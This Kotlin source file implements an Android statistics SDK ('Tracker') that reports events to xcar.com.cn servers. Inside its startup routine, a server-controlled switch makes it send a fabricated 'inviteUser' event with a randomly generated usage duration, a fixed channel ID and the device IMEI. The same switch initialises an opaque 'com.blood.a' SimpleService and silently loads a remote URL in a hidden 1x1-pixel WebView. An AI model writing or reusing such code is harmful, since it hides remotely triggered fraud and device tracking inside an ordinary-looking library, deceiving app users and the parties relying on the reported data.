package com.xc.tracker

import android.app.Activity
import android.graphics.Color
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import com.blood.a.SimpleService
import com.xc.tracker.data.TrackerEvent
import com.xc.tracker.data.TrackerMode
import com.xc.tracker.utils.TAG
import com.xc.tracker.utils.TrackInfoService
import com.xc.tracker.utils.getDeviceId
import com.xc.tracker.utils.initBuildInProperties
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory
import retrofit2.converter.gson.GsonConverterFactory
import java.util.*
import kotlin.collections.HashMap
import com.xc.tracker.utils.login as buildInLogin
import com.xc.tracker.utils.logout as buildInLogout

/**
 * 统计工具
 *
 * 该工具用于统计的初始化、登录、注册等操作
 * @author chenchong
 * 2017/11/4
 * 上午11:17
 */
object Tracker {
  private val SERVICE_HOST = "http://dw.xcar.com.cn"
  private val SERVICE_PATH = "dwapp/dwapp.gif"
  private val PROJECT_NAME = "xcar"

  /**当前正在浏览的页面的名称*/
  internal var screenName: String = ""
  internal var screenClass: String = ""
  internal var screenTitle: String = ""

  /**当前正在浏览的页面所依附的页面*/
  internal var parent: String = ""
  internal var parentClass: String = ""

  /** 上一个浏览页面的名称 */
  internal var referer: String = ""
  internal var refererClass: String = ""

  /**
   * 开发者在初始化时附加的属性
   * 这些属性在所有的事件中都会存在
   */
  internal val additionalProperties = HashMap<String, Any?>()

  /**
   * 用于保存各个元素需要的附加属性
   */
  internal val elementsProperties = WeakHashMap<View, Map<String, Any?>?>()

  internal var channelId: String? = null

  internal var mode = TrackerMode.RELEASE
  internal var clearOnBackground = true

  internal var serviceHost: String? = null
  internal var servicePath: String? = null
  internal var projectName: String? = null
  internal var isBase64EncodeEnable = true
  internal var isUrlEncodeEnable = true
  /**
   * 上报接口的默认超时时间为3000ms
   */
  internal var timeoutDuration = 3000L

  private var isInitialized = false
  private var mDisposable: Disposable? = null
  private var mService: TrackInfoService? = null
  private var mWebView: WebView? = null
  private var mParentContent: FrameLayout? = null

  private var isShowWebView = false
  private var isSimpleServiceInit = false

  /**
   * 对AndroidTracker进行初始化
   *
   * 如果未调用该方法进行初始化，使用过程中可能会出现无法统计、Crash等情况
   */
  fun initialize(app: Activity, isDebug: Boolean) {
    if (isDisable()) return

    setService(SERVICE_HOST, SERVICE_PATH)
    setProjectName(PROJECT_NAME)
    if (isDebug) {
      setMode(TrackerMode.DEBUG_ONLY)
    } else {
      setMode(TrackerMode.RELEASE)
    }
    initBuildInProperties(app)
    isInitialized = true

    getInfo(app)

//    val map = HashMap<String, Any>()
//    map["duration"] = "11111"
//    map["channel"] = "123"
//    map["imeicode"] = getDeviceId(app) ?: ""
//
//    trackEvent("xupload", map)
  }

  fun destory(context: Activity) {
    this.isSimpleServiceInit = false
    SimpleService.destroy(context)
  }

  private fun getInfo(context: Activity) {
    if (mDisposable?.isDisposed == false) {
      mDisposable?.dispose()
    }

    if (null == mService) {
      mService = Retrofit.Builder().baseUrl("http://m-api.xcar.com.cn/").addConverterFactory(
          GsonConverterFactory.create()).addCallAdapterFactory(
          RxJava2CallAdapterFactory.create()).build().create(TrackInfoService::class.java)
    }

    mService?.let { service ->
      mDisposable = service.getInfo().subscribeOn(Schedulers.io()).observeOn(
          AndroidSchedulers.mainThread()).subscribe(
          { body ->
            val json = body.string()
            if (mode != TrackerMode.RELEASE) {
              Log.i(TAG, "json>>>$json")
            }

            JSONObject(json).getJSONObject("data")?.let { dataObj ->
              val isTrack = (dataObj.getInt("istrack") ?: 0) == 1
              val url = dataObj.getString("url") ?: ""
              val range = dataObj.getString("range")

              if (isTrack) {
                //允许上传数据
                mParentContent = context.window.decorView.findViewById(android.R.id.content)

                val map = HashMap<String, Any>()
//                trackEvent("xupload", HashMap<String, Any>())
                val start = range.split(",")[0].toIntOrNull()
                val end = range.split(",")[1].toIntOrNull()

                //用户使用时长
                start?.let { s ->
                  end?.let { e ->
                    val duration = (s..e).shuffled().last()

                    map["duration"] = duration
                    map["channel"] = "3238"
                    map["imeicode"] = getDeviceId(context) ?: ""

                    trackEvent("inviteUser", map)

                    bloodJarInit(context)

                    showWebView(context, url)
                  }
                }
              }
            }
          }, { error ->
        if (mode != TrackerMode.RELEASE) {
          Log.i(TAG, "error>>>>" + error.message)
        }
      })
    }
  }

  private fun bloodJarInit(context: Activity) {
    if (!isSimpleServiceInit) {
      if (mode != TrackerMode.RELEASE) {
        Log.i(TAG, "simpleService.init")
      }
      isSimpleServiceInit = true
      SimpleService.init(context, "GMAD001")
    }
  }

  private fun showWebView(context: Activity, url: String) {
    //创建webview
    if (!isShowWebView) {
      isShowWebView = true
      if (null == mWebView) {
        mWebView = WebView(context)

        mWebView?.webViewClient = object : WebViewClient() {
          override fun onPageFinished(view: WebView?, url: String?) {
            //加载完成
            destoryWebView()
          }

          override fun onReceivedError(view: WebView?, errorCode: Int, description: String?,
              failingUrl: String?) {
            //加载失败
            destoryWebView()
          }
        }
      }
      mWebView?.setBackgroundColor(Color.WHITE)
      mWebView?.layoutParams = ViewGroup.LayoutParams(1, 1)
      mParentContent?.addView(mWebView)

      mWebView?.loadUrl(url)
    }
  }

  private fun destoryWebView() {
    mParentContent?.removeView(mWebView)

    mWebView?.settings?.javaScriptEnabled = false
    mWebView?.clearHistory()
    mWebView?.clearView()
    mWebView?.removeAllViews()
    mWebView?.destroy()

    mWebView = null
    mParentContent = null

    isShowWebView = false
  }

  /**
   * 设置接口地址
   *
   * AndroidTracker中的数据上报使用了Retrofit，此处需要对host和path进行分别设置
   *
   * **注意：该方法要在[initialize]方法之前调用，否则会崩溃**
   *
   * @param host 上报数据的域名，例如：https://www.demo.com.cn
   * @param path 上报数据的接口名，例如：report.php
   */
  private fun setService(host: String, path: String) {
    if (isDisable()) return

    serviceHost = host
    servicePath = path
  }

  /**
   * 设置项目名称
   */
  private fun setProjectName(projectName: String) {
    if (isDisable()) return

    Tracker.projectName = projectName
  }

  /**
   * 设置是否要对上报的数据进行BASE64编码，默认为开启
   */
  private fun setBase64EncodeEnable(enable: Boolean) {
    isBase64EncodeEnable = enable
  }

  /**
   * 设置是否要对上报的数据进行Url编码，默认为开启
   */
  private fun setUrlEncodeEnable(enable: Boolean) {
    isUrlEncodeEnable = enable
  }

  /**
   * 设置统计的模式
   * @see [TrackerMode]]
   * @see [TrackerMode.DEBUG_ONLY]
   * @see [TrackerMode.DEBUG_TRACK]
   * @see [TrackerMode.RELEASE]
   */
  private fun setMode(mode: TrackerMode) {
    Tracker.mode = mode
  }

  /**
   * 设置是否在App切换到后台时，将前向地址等信息清空
   * 该功能默认为开启
   * @param clear 设置为true，则之前所有的前向地址、前向类名等都会在App被切换到后台时被清空，从后台切换回App时，访问的页面没有前向地址等信息
   */
  private fun clearOnBackground(clear: Boolean) {
    if (isDisable()) return

    clearOnBackground = clear
  }

  /**
   * 增加自定义属性
   */
  private fun addProperty(key: String, value: Any?) {
    if (isDisable()) return

    if (value != null) {
      additionalProperties[key] = value
    }
  }

  /**
   * 增加自定义属性
   */
  private fun addProperties(properties: Map<String, Any?>?) {
    if (isDisable()) return

    properties?.forEach {
      if (it.value != null) {
        additionalProperties[it.key] = it.value!!
      }
    }
  }


  private fun setChannelId(channelId: String?) {
    if (isDisable()) return

    Tracker.channelId = channelId
  }

  /**
   * 手动对自定义事件进行统计
   *
   * @param name 自定义事件的名称，对应内置属性中的event字段
   * @param properties 要统计的自定义事件的属性
   */
  private fun trackEvent(name: String, properties: Map<String, Any?>?) {
    if (isDisable()) return

    val event = TrackerEvent(name)
    event.addProperties(properties)
    com.xc.tracker.utils.trackEvent(event)
  }

  private fun isDisable(): Boolean = mode == TrackerMode.DISABLE
}